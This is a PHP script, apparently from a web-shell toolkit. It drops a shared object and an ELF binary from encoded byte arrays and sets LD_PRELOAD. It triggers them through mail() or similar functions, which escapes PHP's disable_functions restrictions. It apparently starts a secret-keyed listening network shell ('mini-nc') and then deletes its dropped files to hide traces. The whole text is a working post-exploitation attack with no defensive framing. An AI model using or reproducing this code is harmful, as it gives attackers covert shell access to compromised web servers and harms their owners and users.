function generate_random_string($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString  = '';

	for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function unpack_object($object)
{
    $object = explode(',', $object);
    $bytes = '';
    foreach($object as $byte) {
        $bytes.= pack('Q*', $byte);
    }
    return $bytes;
}

$secret_key = generate_random_string(22);
echo 'mini-nc -s ' . $secret_key;

$absolute_path = realpath(getcwd());
$ms_args = sprintf('-s %s -l', $secret_key);
file_put_contents($absolute_path . '/.env-ms', $secret_key);
chmod($absolute_path . '/.env-ms', 0600);

// shared object
$object_x64 = unpack_object($preload_content_x64);
file_put_contents('x64.so', $object_x64);
$mini_bin_x64 = unpack_object($mini_socket_x64);
file_put_contents('x64_ms', $mini_bin_x64);

// check object
if (filesize($absolute_path . '/x64.so') == 0) {
    die('Unable to put shared object please compile and place it manually');
}
if (filesize($absolute_path . '/x64_ms') == 0) {
    die('Unable to put elf please compile and place it manually');
}
if (filesize($absolute_path . '/.env-ms') == 0) {
    die('Unable to put environment please do it manually');
}

// set environment variables
putenv(sprintf('PRELOAD=%s', $absolute_path . '/x64_ms'));
putenv(sprintf('LD_PRELOAD=%s', $absolute_path . '/x64.so'));
putenv(sprintf('GS_ARGS=%s', $ms_args));

// running preload
if(function_exists('mail')) {
    @mail('a','a','a','a');
} elseif(function_exists('mb_send_mail')) {
    @mb_send_mail('a','a','a','a'); // alternative mail()
} elseif(function_exists('error_log')) {
    @error_log('a',1,'a');
} elseif(function_exists('imap_mail')) {
    @imap_mail('a','a','a');
} elseif(function_exists('error_log')) {
    @error_log('a',1,'a');
}

// cleanup
sleep(3);

unlink($absolute_path . '/x64.so');
unlink($absolute_path . '/x64_ms');
unlink($absolute_path . '/.env-ms');
